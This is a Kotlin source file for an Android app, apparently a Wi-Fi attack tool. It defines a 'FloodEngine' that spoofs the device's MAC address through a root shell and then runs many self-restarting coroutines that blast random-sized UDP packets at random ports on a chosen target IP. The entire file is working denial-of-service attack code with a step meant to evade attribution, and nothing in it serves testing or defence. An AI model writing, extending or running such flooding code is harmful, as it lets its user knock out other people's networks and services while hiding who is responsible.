package com.twks.wifi

import android.util.Log
import kotlinx.coroutines.*
import java.net.InetAddress
import java.net.InetSocketAddress
import java.nio.ByteBuffer
import java.nio.channels.DatagramChannel
import java.util.concurrent.atomic.AtomicLong
import kotlin.random.Random

object FloodEngine {
    @Volatile private var isAttacking = false
    private val packetCount = AtomicLong(0)
    private val jobScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun startFlood(targetIp: String, threads: Int) {
        if (isAttacking) return
        isAttacking = true
        packetCount.set(0)

        RootShell.randomizeMac("wlan0")

        val address = try {
            InetAddress.getByName(targetIp)
        } catch (e: Exception) {
            Log.e("TWKS", "Invalid IP: $targetIp", e)
            return
        }

        for (i in 0 until threads) {
            jobScope.launch {
                val random = Random(System.nanoTime() + i)
                var localCount = 0L

                // самовосстановление: поток живет до стопа, канал пересоздается при сбое
                while (isAttacking && currentCoroutineContext().isActive) {
                    var channel: DatagramChannel? = null
                    try {
                        channel = DatagramChannel.open()
                        channel.configureBlocking(false)
                        try { channel.socket().sendBufferSize = 4194304 } catch (e: Exception) {}
                        try { channel.socket().trafficClass = 0x10 } catch (e: Exception) {}

                        while (isAttacking) {
                            val len = random.nextInt(512, 1401)
                            val payload = ByteArray(len).apply { random.nextBytes(this) }
                            var stalled = false

                            repeat(3) {
                                val port = random.nextInt(1024, 65535)
                                val sent = try {
                                    channel.send(ByteBuffer.wrap(payload), InetSocketAddress(address, port))
                                } catch (e: Exception) {
                                    -1
                                }
                                if (sent > 0) localCount++ else stalled = true
                            }

                            if (localCount >= 1000) {
                                packetCount.addAndGet(localCount)
                                localCount = 0L
                            }
                            // очередь ядра полна: отступаем, но не умираем
                            if (stalled) delay(2)
                        }
                    } catch (e: Exception) {
                        delay(50)
                    } finally {
                        packetCount.addAndGet(localCount)
                        localCount = 0L
                        try { channel?.close() } catch (e: Exception) {}
                    }
                }
            }
        }
    }

    fun stopFlood() {
        isAttacking = false
        jobScope.coroutineContext[Job]?.cancelChildren()
        RootShell.restoreMac("wlan0")
    }

    fun getPacketCount(): Long = packetCount.get()
}
